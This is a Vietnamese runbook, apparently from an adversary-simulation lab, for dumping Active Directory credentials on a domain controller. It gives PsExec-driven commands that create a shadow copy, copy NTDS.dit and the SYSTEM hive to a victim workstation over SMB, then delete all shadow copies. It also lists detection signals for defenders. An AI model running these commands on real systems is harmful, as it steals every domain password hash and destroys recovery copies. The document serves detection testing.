# DC — Domain Controller
## Không cần file nào pre-staged

Tất cả lệnh trên DC được thực thi **từ xa** qua PsExec (từ Victim WS).

## Yêu cầu

- Join domain (đã có sẵn)
- Có NTDS.dit (AD DS running)
- User domain có quyền Domain Admin hoặc Local Admin trên DC

## Các lệnh sẽ chạy tự động (qua PsExec từ Victim)

```cmd
:: Tạo VSS shadow copy
vssadmin create shadow /for=C:

:: Copy NTDS.dit từ shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit

:: Export SYSTEM hive  (T1003.003 - Calibrated)
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive /y

:: Stage về victim qua SMB
copy C:\Windows\Temp\ntds.dit \\192.168.10.27\C$\Windows\Temp\ntds.dit
copy C:\Windows\Temp\system.hive \\192.168.10.27\C$\Windows\Temp\system.hive
```

## Cleanup sau simulation

```cmd
del C:\Windows\Temp\ntds.dit
del C:\Windows\Temp\system.hive
vssadmin delete shadows /all /quiet
```

## Lưu ý Detection

Signal quan trọng (Calibrated T1003.003):
- Process: `PSEXESVC.exe` spawns `cmd.exe`
- Command: `reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.hive`
- Process: `PSEXESVC.exe` spawns `vssadmin.exe create shadow`
